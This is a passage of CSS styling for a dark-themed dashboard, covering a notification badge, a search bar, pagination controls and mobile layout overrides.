    color: #22c55e; border: 1px solid rgba(34,197,94,0.3);
    font-family: 'JetBrains Mono',monospace; flex-shrink: 0;
  }

  /* ── Bottom nav notification badge ───────────────────────────────────────── */
  .bn-notif-badge {
    position: absolute; top: -4px; right: -4px;
    min-width: 15px; height: 15px; border-radius: 8px;
    background: #ef4444; color: #fff;
    font-size: 8px; font-weight: 800;
    display: flex; align-items: center; justify-content: center;
    padding: 0 2px; pointer-events: none;
    border: 2px solid #0b0e17;
  }


  /* Inline dashboard filter search bar */
  .dt-search-wrap {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 20px;
    padding: 3px 10px 3px 9px;
    min-width: 170px;
    max-width: 280px;
    color: #94a3b8;
    transition: all 140ms;
    height: 28px;
    flex: 1 1 auto;
  }
  .dt-search-wrap:focus-within {
    border-color: rgba(249, 115, 22, 0.5);
    background: rgba(249, 115, 22, 0.06);
    color: #f97316;
    box-shadow: 0 0 10px rgba(249, 115, 22, 0.15);
  }
  .dt-search-in {
    background: transparent;
    border: none;
    outline: none;
    color: #f1f5f9;
    font-size: 11.5px;
    font-family: inherit;
    width: 100%;
    min-width: 70px;
  }
  .dt-search-in::placeholder {
    color: #475569;
  }
  .dt-search-clear {
    background: none;
    border: none;
    color: #64748b;
    font-size: 11px;
    cursor: pointer;
    padding: 0;
    line-height: 1;
    display: flex;
    align-items: center;
    transition: color 100ms;
  }
  .dt-search-clear:hover {
    color: #cbd5e1;
  }

  /* Filtered result count & top pagination bar */
  .dt-count-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 8px;
    padding: 7px 14px;
    background: rgba(255, 255, 255, 0.02);
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    flex-shrink: 0;
  }
  .dt-count {
    font-size: 11.5px;
    color: #94a3b8;
    display: flex;
    align-items: center;
    gap: 5px;
    font-weight: 500;
  }
  .dt-cnt-val {
    color: #f1f5f9;
    font-weight: 700;
  }
  .dt-filter-tag {
    color: #f97316;
    font-weight: 600;
  }
  .pag-compact {
    display: inline-flex;
    align-items: center;
    gap: 6px;
  }
  .pag-btn-sm {
    height: 26px;
    padding: 0 10px;
    border-radius: 6px;
    background: rgba(255, 255, 255, 0.08);
    border: 1px solid rgba(255, 255, 255, 0.14);
    color: #e2e8f0;
    font-size: 11.5px;
    font-weight: 600;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    gap: 3px;
    transition: all 120ms;
    font-family: inherit;
  }
  .pag-btn-sm:hover:not(:disabled) {
    background: rgba(249, 115, 22, 0.2);
    color: #f97316;
    border-color: rgba(249, 115, 22, 0.45);
  }
  .pag-btn-sm:disabled {
    opacity: 0.3;
    cursor: not-allowed;
    color: #475569;
    background: rgba(255, 255, 255, 0.02);
    border-color: rgba(255, 255, 255, 0.04);
  }
  .pag-pill {
    font-size: 11.5px;
    color: #94a3b8;
    background: rgba(0, 0, 0, 0.3);
    padding: 3px 9px;
    border-radius: 6px;
    border: 1px solid rgba(255, 255, 255, 0.06);
    font-family: "JetBrains Mono", monospace;
  }
  .pag-pill strong {
    color: #f97316;
    font-weight: 700;
  }

  /* ── Pagination bar (Bottom) ─────────────────────────────────────────────── */
  .pag-bar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 10px;
    padding: 10px 14px;
    background: #111726;
    border-top: 1px solid rgba(255, 255, 255, 0.08);
    flex-shrink: 0;
  }
  .pag-group-left {
    display: flex;
    align-items: center;
  }
  .pag-summary {
    font-size: 12px;
    color: #94a3b8;
    font-family: "JetBrains Mono", monospace;
  }
  .pag-summary strong {
    color: #f1f5f9;
  }
  .pag-group-controls {
    display: flex;
    align-items: center;
    gap: 5px;
    flex-wrap: wrap;
  }
  .pag-btn {
    height: 30px;
    border-radius: 7px;
    background: rgba(255, 255, 255, 0.07);
    border: 1px solid rgba(255, 255, 255, 0.12);
    color: #cbd5e1;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    transition: all 120ms;
    font-family: inherit;
    font-size: 12px;
    font-weight: 500;
  }
  .pag-btn-nav {
    padding: 0 9px;
    gap: 4px;
  }
  .pag-btn-txt {
    font-size: 11.5px;
  }
  .pag-nums {
    display: inline-flex;
    align-items: center;
    gap: 4px;
  }
  .pag-btn.pag-num {
    min-width: 30px;
    height: 30px;
    padding: 0 6px;
    font-weight: 600;
    font-size: 12px;
    font-family: "JetBrains Mono", monospace;
  }
  .pag-btn.pag-num.active {
    background: #f97316;
    color: #ffffff;
    border-color: #f97316;
    box-shadow: 0 2px 8px rgba(249, 115, 22, 0.4);
    font-weight: 700;
  }
  .pag-info-badge {
    font-size: 11.5px;
    color: #94a3b8;
    background: rgba(0, 0, 0, 0.35);
    padding: 4px 9px;
    border-radius: 6px;
    border: 1px solid rgba(255, 255, 255, 0.07);
    font-family: "JetBrains Mono", monospace;
  }
  .pag-info-badge strong {
    color: #f97316;
  }
  .pag-btn:hover:not(:disabled) {
    background: rgba(249, 115, 22, 0.18);
    color: #f97316;
    border-color: rgba(249, 115, 22, 0.4);
  }
  .pag-btn:disabled {
    opacity: 0.3;
    cursor: not-allowed;
    background: rgba(255, 255, 255, 0.02);
    border-color: rgba(255, 255, 255, 0.04);
    color: #475569;
  }

  /* ── Mobile responsive overrides for dashboard devices & scrolling ────────── */
  @media (max-width: 768px) {
    .tab-body-overview {
      padding: 10px 12px calc(65px + env(safe-area-inset-bottom, 0px)) !important;
      gap: 8px !important;
    }
    .stat-row {
      grid-template-columns: repeat(4, 1fr) !important;
      gap: 5px !important;
    }
    .stat-card {
      padding: 6px 8px !important;
    }
    .sc-n {
      font-size: 20px !important;
    }
    .sc-l {
      font-size: 8px !important;
    }
    .live-card {
      padding: 8px 12px !important;
      gap: 8px !important;
    }
    .lc-icon {
      width: 36px !important;
      height: 36px !important;
    }
    .lc-title {
      font-size: 13px !important;
    }
    .lc-sub {
      font-size: 10px !important;
    }
    .sidebar {
      padding-bottom: 0 !important;
    }
    .side-dev-list {
      padding-bottom: 28px !important;
      min-height: 0 !important;
      -webkit-overflow-scrolling: touch !important;
    }
    .pag-bar {
      justify-content: center;
      padding: 8px 10px;
    }
    .pag-summary {
      font-size: 11px;
      width: 100%;
      text-align: center;
    }
    .pag-btn-txt {
      display: none;
    }
    .pag-btn-nav {
      padding: 0 7px;
    }
  }

</style>



